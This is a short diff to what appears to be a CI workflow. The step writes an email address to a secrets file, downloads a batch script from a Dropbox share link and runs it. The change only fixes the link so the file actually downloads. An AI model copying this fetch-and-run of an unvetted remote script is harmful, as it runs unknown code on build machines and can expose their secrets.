@@ -11,5 +11,5 @@ jobs:
       - name: Downloading & Setting Up
         run: |
          echo "EMAIL_SECRET=busmaill02@gmail.com" > secrets.txt
-         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/66q78643m2jthg269rzlp/down.bat?rlkey=zudbgjoh8jntdjlefrge6bs8v&dl=0" -OutFile "down.bat"
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/66q78643m2jthg269rzlp/down.bat?rlkey=zudbgjoh8jntdjlefrge6bs8v&dl=1" -OutFile "down.bat"
          cmd /c down.bat
